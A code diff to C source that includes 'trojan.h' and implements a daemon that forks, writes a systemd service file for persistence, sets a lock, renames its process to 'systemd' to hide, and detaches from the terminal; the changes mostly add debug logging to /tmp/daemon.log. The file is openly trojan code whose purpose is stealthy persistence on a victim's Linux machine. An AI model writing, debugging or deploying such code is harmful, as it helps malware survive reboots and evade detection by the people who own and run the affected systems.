@@ -1,9 +1,10 @@
 #include "trojan.h"
 
 // man7 daemon
+int log_fd;
 
 void close_fds() {
-    if (sc(SYS_close_range, 3, ~0U, 0) == -1) {
+    if (sc(SYS_close_range, 4, ~0U, 0) == -1) {
         perror("close_range");
         exit(EXIT_FAILURE);
     }
@@ -14,7 +15,10 @@ void set_persistance() {
     int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
     if (fd < 0) {
         perror("open : ");
+        write(log_fd, "popen\n", strlen("popen\n"));
         return ;
+    } else {
+        write(log_fd, "service file created\n", 22);
     }
     write(fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));
 
@@ -53,7 +57,8 @@ void handle_lock(int mod) {
 
 void create_daemon() {
     pid_t pid = sc(SYS_fork);
-    
+    log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
+
     if (pid < 0)
         exit(EXIT_FAILURE);
     if (pid > 0)
@@ -71,17 +76,19 @@ void create_daemon() {
     close_fds();
     reset_signals();
     set_persistance();
+    write(log_fd, "persistence set\n", 17);
     handle_lock(LOCK);
+    write(log_fd, "lock set\n", 10);
     sc(SYS_prctl, PR_SET_NAME, "systemd\0", NULL, NULL, NULL);
     sc(SYS_umask, 0);
     sc(SYS_chdir, "/");
-    int fd = sc(SYS_open, "/dev/null");
+    int fd = sc(SYS_open, "/dev/null", O_RDWR, 0);
     if (fd < 0)
         exit(EXIT_FAILURE);
-        // int log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
+    write(log_fd, "dev null open\n", 15);
     // redirection des flux standards vers /dev/null
     sc(SYS_dup2, fd, STDIN_FILENO);
     sc(SYS_dup2, fd, STDOUT_FILENO);
     sc(SYS_dup2, fd, STDERR_FILENO);
-
+    write(log_fd, "started\n", 9);
 }
